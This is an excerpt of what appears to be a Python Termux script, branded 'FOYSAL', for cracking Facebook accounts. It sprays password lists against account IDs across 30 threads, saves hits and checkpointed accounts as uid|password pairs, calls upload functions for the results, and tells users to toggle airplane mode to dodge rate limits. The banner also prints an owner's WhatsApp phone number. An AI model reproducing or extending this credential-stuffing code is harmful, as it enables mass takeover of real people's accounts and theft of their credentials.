...
\033[1;32m ##        #######     ##     ######  ##     ## ######## 
  ...
  \033[1;92m╔════════════════════════════╗╔══════════════════════════╗
  \033[1;91;1m█ \033[1;37m [•] \033[1;31;1mTOOLS OWNER     \033[1;37m [•]  \033[1;32m║║ \033[1;37m [•] \033[1;31;1m FOYSAL HOSEN \033[1;37m  [•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;32;1mFACEBOOK PAGE   \033[1;37m [•]\033[1;32m  ║║ \033[1;37m [•] \033[1;32m  Termux FOYSAL   \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;33;1mGITHUB USER     \033[1;37m [•]\033[1;32m  ║║ \033[1;37m [•] \033[1;33m  FOYSAL-404     \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;34;1mWHATS APP NUMBER\033[1;37m [•]  \033[1;32m║║ \033[1;37m [•] \033[1;34m+8801793268786 \033[1;37m[•]  \033[1;31m█ 
...
class timer:
        ...
        try:
            ...
            with ThreadPoolExecutor(max_workers=30) as coeg:
                ...
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (R))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]" % (Y, listpass))
                print("\n%s [+] OK RESULTS SAVED IN -> FOYSAL-ok.txt" % (G))
                print("%s [+] CP RESULTS SAVED IN -> FOYSAL-cp.txt" % (Y))
                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n" % (R))
                print("\033[1;97m===============================================================")
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
    ...
    def old4_7(self):
        ...
        try:
            ...
            with ThreadPoolExecutor(max_workers=30) as coeg:
                ...
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]" % (Y, listpass))
                print("\n%s [+] OK RESULTS SAVED IN -> FOYSAL-ok.txt" % (G))
                print("%s [+] CP RESULTS SAVED IN -> FOYSAL-cp.txt" % (R))
                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n" % (R))
                print("\033[1;97m===============================================================")
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
        ...
        try:
            ...
            with ThreadPoolExecutor(max_workers=30) as coeg:
                ...
                if len(listpass) <= 5:
                    exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS" % (R))
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]" % (Y, listpass))
                print("\n%s [+] OK RESULTS SAVED IN -> FOYSAL-CP.txt" % (G))
                print("%s [+] CP RESULTS SAVED IN -> FOYSAL-CP.txt" % (Y))
                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n" % (R))
                print("\033[1;97m===============================================================")
                for user in self.id:
    ...
    def email(self):
        ...
        try:
            ...
            with ThreadPoolExecutor(max_workers=30) as coeg:
                ...
                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]" % (Y, listpass))
                print("\n%s [+] OK RESULTS SAVED IN -> FOYSAL-ok.txt" % (G))
                print("%s [+] CP RESULT SAVED IN -> FOYSAL-cp.txt" % (Y))
                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n" % (R))
                print("\033[1;97m===============================================================")
                for user in self.id:
                    coeg.submit(self.api, user, listpass.split(","))
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write("\r\r %s[FOYSAL]  %s/%s   \033[0;92m[OK:-%s]    \033[0;91m[CP:-%s]" % (
        ...
        for pw in pwx:
            ...
            if "session_key" in response.text and "EAAA" in response.text:
                ...
                open("ok.txt", "a").write(" [FOYSAL-OK] %s|%s\n" % (uid, pw))
                uploadoks()
                break
            elif "www.facebook.com" in response.json()["error_msg"]:
                print("\r \033[0;91m[FOYSAL-CP] %s|%s\033[0;97m         " % (uid, pw))
                self.cp.append("%s|%s" % (uid, pw))
                open("cp.txt", "a").write(" [FOYSAL-CP] %s|%s\n" % (uid, pw))
                uploadcps()
                break
            else:
                continue
